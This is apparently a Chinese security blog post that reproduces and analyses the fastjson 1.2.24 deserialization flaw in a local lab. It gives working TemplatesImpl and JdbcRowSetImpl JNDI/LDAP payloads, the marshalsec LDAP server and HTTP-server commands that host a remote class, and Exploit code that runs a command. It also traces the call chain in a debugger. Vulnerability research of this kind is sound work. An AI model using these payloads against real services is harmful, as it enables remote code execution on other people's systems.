---
title: 复现及分析fastjson1.2.24
date: 2020-12-16 16:00:28
tags: 复现 漏洞分析
---


# fastjosn 反序列化漏洞学习

## fastjson 1.2.24反序列化漏洞复现

## 先写一个正常的使用 fastjson的web服务

我们使用 springboot创建  

![目录结构](img/2020-12-08-14-49-01.png)  

主要是pom.xml 里面要添加fastjson  
fastjson要求小于等于 1.2.24  
```xml
    <dependency>
        <groupId>com.alibaba</groupId>
        <artifactId>fastjson</artifactId>
        <version>1.2.23</version>
    </dependency>
```

### 简单写个路由解析

controller.Login.java  
```java
@Controller
public class Login {
    @RequestMapping(value = "/fastjson", method = RequestMethod.POST)
    @ResponseBody
    public JSONObject test(@RequestBody String data) {
        JSONObject obj = JSON.parseObject(data);
        // JSONObject obj = JSON.parseObject(data, Feature.SupportNonPublicField); // 当使用 TemplatesImpl的时候用这个
        JSONObject result = new JSONObject();
        result.put("code", 200);
        result.put("message", "success");
        result.put("data", "Hello " + obj.get("name"));
        return result;
    }
}

```

model.User.java  

```java

public class User {
    public String name;
    public int age;
    public String id_card;

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public int getAge() {
        return age;
    }

    public void setAge(int age) {
        this.age = age;
    }

    public String getId_card() {
        return id_card;
    }

    public void setId_card(String id_card) {
        this.id_card = id_card;
    }


}

```

controller.Login 是一个控制器是一个路由用于解析请求  
model.User 是一个用户类 包含一些属性用于fastjson与数据对应解析  


### 请求

这里发送的数据是这样的  

```json
{
	"@type": "com.example.demo.model.User",
	"name": "Recar",
	"age": 22,
	"id_card": "12334567"
}
```

@type 是用于fastjson找到数据对应的类 下面的是User的属性值  


![请求](img/2020-12-08-14-56-58.png)


我们这里可以看到成功解析了数据  
## 复现及分析

### 基于TemplatesImpl的复现与分析


因为poc用到了 私有属性 fastjson默认不会解析私有属性 需要开启这个  `Feature.SupportNonPublicField`  

![有私有属性](img/2020-12-11-16-47-35.png)  


payload  
```json
{
	"@type": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
	"_bytecodes": ["yv66vgAAADEALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQANTHBlcnNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACUBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAHAAgHACcMACgAKQEABGNhbGMMACoAKwEAC3BlcnNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAADwAEABAADQARAAsAAAAMAAEAAAAOAAwADQAAAA4AAAAEAAEADwABABAAEQABAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAFQALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABQAFQACAAAAAQAWABcAAwABABAAGAACAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAAGgALAAAAIAADAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABkAGgACAA4AAAAEAAEAGwABABwAAAACAB0="],
	"_name": "a.b",
	"_tfactory": {},
	"_outputProperties": {}
}
```


`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`  


`type`是想要序列化类的路径  
 `_bytecodes` 最后调用getOutputProperties时会进行创建的Exploit类的class 二进制base64编码


发poc后断点调试  


![第一个断点](img/debug第一个断点.jpg) 


点击第一个下一步箭头跟进 (F8) F7那个是跟入函数 我们跟入函数  

![解析传过来的json](img/解析传过来的json.jpg) 

可以直接快进到语法解析  

![语法解析](img/语法解析.jpg) 

语法解析的token  
![语法解析的token](img/语法解析的token.jpg) 



JavaBeanInfo build方法  
getDeclaredFields 获得某个类的所有声明的字段，即包括public、private和proteced，但是不包括父类的申明字段  
![JavaBeanInfo build方法](img/JavaBeanINFO.jpg)  


getDeclaredFields 获取到的属性值  


![getDeclaredFields 获取到的属性值](img/getDeclaredFields获取到的属性值.jpg)  


程序会 创建了一个 数组存储后续将要处理的目标类的特定setter方法及特定条件的getter方法  
调用getter条件就是如下图 

![判断是否get](img/判断是否get.jpg)  



## 进入调用get的条件

```java
 String methodName = method.getName();
if (
     methodName.length() >= 4 && // 方法名长度要大于等于4
     !Modifier.isStatic(method.getModifiers()) &&  // 不是静态方法
     methodName.startsWith("get") &&  // 以get字符串开头
     Character.isUpperCase(methodName.charAt(3)) &&  // 第4个字符要是大写字母
     method.getParameterTypes().length == 0 &&  // 方法不能有参数传入

     (Collection.class.isAssignableFrom(method.getReturnType()) || 
     Map.class.isAssignableFrom(method.getReturnType()) || 
     AtomicBoolean.class == method.getReturnType() || 
     AtomicInteger.class == method.getReturnType() || 
     AtomicLong.class == method.getReturnType())) 
     // 继承自Collection || Map || AtomicBoolean || AtomicInteger || AtomicLong
          

```

继续走 走到 getOutputProperties 符合get的所有要求  
并且将`getOutputProperties` 加入到 后面会进行调用的列表里  
![符合要求的方法.jpg](img/符合要求的方法.jpg)  

可以看到列表里有 这个方法  
![写到filedinfo.jpg](img/写到filedinfo.jpg)  


后面反射创建实例后调用方法设置 `_bytecodes`值  


![](img/2020-12-09-17-06-26.png)

然后调用 getOutputProperties 我们跟进   

要求_name不能为空 空的话直接返回了  

![nam不能为空.jpg](img/nam不能为空.jpg)  


_bytecodes 不能为空  
![bytecodes不能为空.jpg](img/bytecodes不能为空.jpg)  

然后继续
会调用 _tfacroty的getExternalExtensionsMap()方法 所以tfacroty要设置个{} 
![tfacroty.jpg](img/tfacroty.jpg)  

这里可以看到 tfacroty 不是一个空的{} 
![这里可以看到tfactory不是空的.jpg](img/这里可以看到tfactory不是空的.jpg)  


`tfactory 为啥不是空的` 是fastjson在这里对空的对象解析后会赋值应有的对象 在 TemplatesImpl里可以看到 `private transient TransformerFactoryImpl _tfactory = null;`




![trfactory应有的格式.jpg](img/trfactory应有的格式.jpg) 

并且跟进后可以看到有 getExternalExtensionsMap方法  


![可以看到有getExternalEcensionsMap方法.jpg](img/可以看到有getExternalEcensionsMap方法.jpg)  



_class[_transletIndex] 就是我们的要执行的类  

newInstance 会调用构造函数 类似new newInstance只能调用无参数的构造函数  


![_class[_transletIndex]](img/_class[_transletIndex].jpg)  




下划线是怎么回事去掉的  
在 JavaBeanDeserializer中会把set get方法的下划线去掉  
![JavaBeanDeserializer中会把下划线去掉.jpg](img/JavaBeanDeserializer中会把下划线去掉.jpg)  

poc中的 `_outputProperties` 去掉下划线也可以用
其他属性字段是不行的  



## 基于jndi ldap方法的攻击链  

因为我本机的jdk不满足 rmi的条件 于是使用的ldap的方式来复现  

ldap的方式是使用外部加载class的形式  


payload  

```json
{
	"@type":"com.sun.rowset.JdbcRowSetImpl",
	"dataSourceName":"ldap://localhost:1389/Exploit",
	"autoCommit":true
}
```


### 使用  marshalsec 构建 ldap服务  
java环境：jdk1.8.0_161 < 1.8u191 (可以使用ldap注入)  
git 先下载下来
`git clone git@github.com:mbechler/marshalsec.git`  

mvn 编译成jar包 (mvn最好配置好国内的比如阿里的maven源)  

`mvn clean package -DskipTests`  

最后target目录下输出  `marshalsec-0.0.3-SNAPSHOT-all.jar`  

启动  `java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/#Exploit`  

这里是启动了个ldap 然后我们需要构建个简单的web服务返回exploit  

![ldap启动](img/2020-12-08-15-06-25.png)  


## 编写Exploit

执行命令运行计算器  
```java
public class Exploit {
    public Exploit (){
        try{
            Runtime.getRuntime().exec("calc");
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static void  main(String[] argv){
        Exploit e = new Exploit();
    }
}

```
先直接运行 弹出计算器 在out目录下看到 Exploit.class  

## 启动简单web服务

简单实用python创建  
这个是python2的命令  
`python -m SimpleHTTPServer 8081`  

这个命令要在 Exploit.class 目录下执行 端口与上面marshalsec执行命令的端口一致  

![简单web服务](img/2020-12-08-15-07-00.png)  


## postman发送请求

```json
{
	"@type":"com.sun.rowset.JdbcRowSetImpl",
	"dataSourceName":"ldap://localhost:1389/Exploit",
	"autoCommit":true
}
```

![弹出计算器](img/2020-12-08-15-08-16.png)  



断点调试  

解析上传的json  
![parse](img/2020-12-11-17-30-56.png)  

这次会被调用满足条件的是 `setAutoCommit` `setDataSourceName`  


![这次可以调用的是set的setautocommit.jpg](img/这次可以调用的是set的setautocommit.jpg)  


调用set方法的条件是  
```
方法名长度大于4且以set开头，且第四个字母要是大写

非静态方法

返回类型为void或当前类

参数个数为1个
```

![set调用的条件.jpg](img/set调用的条件.jpg) 


然后会设置dataSourceName值  

![设置dataSourceName值.jpg](img/设置dataSourceName值.jpg) 


反射调用setDataSourceNmae  

![反射调用setDataSourceNmae](img/反射调用setDataSourceNmae.jpg) 


反射调用setAutoCommit  

![反射调用setAutoCommit.jpg](img/反射调用setAutoCommit.jpg) 


触发ldap里的lookup方法 并且里面的参数就是我们设置的远程地址 就上面开源的那个工具里很多可以利用的反序列化链  
![触发ldap](img/2020-12-14-14-34-27.png)  



调用链  

![ldap调用链](img/2020-12-14-12-01-50.png)  

可以清晰的看到从 testVuln 接口进入 parse解析json对象后解析字段 设置字段值  
使用invoke动态调用set方法  
可以看到 setAutoCommit的方法调用 这里触发漏洞  
然后是对expoit类的实例化  
远程调用这个expolit的类来实现执行  
最后执行exec的方法  



## 总结

1. 基于TemplatesImpl的利用链 
使用_outputProperties方法可以满足get的条件实现自动调用getOutputProperties 方法并且会使用到私有成员变量 `_bytecodes` 他又是可控的  

2. rmi 或者ldap方式  
是使用基于远程加载类的方式 jndi有个setAutoCommit方式设置为True后会自动调用setValue方法  
使用特定的set方法来自动调用 和可控的参数传入  


3. java会对@type的类型通过 javaBeanInfo 来获取所有的属性和方法  
通过特定条件过滤set和get方法 满足的进行调用 再与可控参数 可控的 @type类 实现命令执行  

